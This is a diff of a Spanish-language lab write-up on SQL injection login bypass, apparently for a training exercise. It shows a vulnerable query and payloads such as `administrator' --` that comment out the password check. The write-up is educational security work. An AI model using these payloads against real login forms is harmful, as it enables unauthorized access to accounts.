@@ -26,7 +26,7 @@ select id,username,subscription from users where username = 'administrator' and 
 ````sql
 select id,username,subscription from users where username = 'administrator' -- and password = 'p@ssw0rd123-1';
 ````
-administrator' --
+
 ![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/4cd5611e-0aac-435f-a45d-4a254b669186)
 
 
@@ -34,25 +34,11 @@ administrator' --
 
 1. Abrir laboratorio y buscar en donde me puedo autenticar
 
-![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/dfe5453b-1098-4799-a0fd-a7a940683d9f)
+2. Ingresar el usuario `administrator` con el payload `administrator' --` o `administrator' -- -` o `administrator' #` _(O cualquiera de sus versiones)_
 
+![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/cb2feaac-5eef-4207-9786-15aa382ef97d)
 
-2. Aquí encuentro donde puedo hacer inputs de strings
-
-![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/e6481b91-47f2-4b54-8cc9-0d036d9d99a1)
-
-
-3. Query que usé (lo puse en ambos campos, aunque se puede usar en el primero y el segundo lo que sea...)
-
-````sql
-administrator'-- -
-````
-````http
-Username: administrator'-- -
-Password: Lo que sea...
-````
-
-![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/95856f02-84de-4067-a9af-65183b9bb6a9)
+![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/f19586fc-90f0-46e3-8172-66a0c69ccdf9)
 
 
 
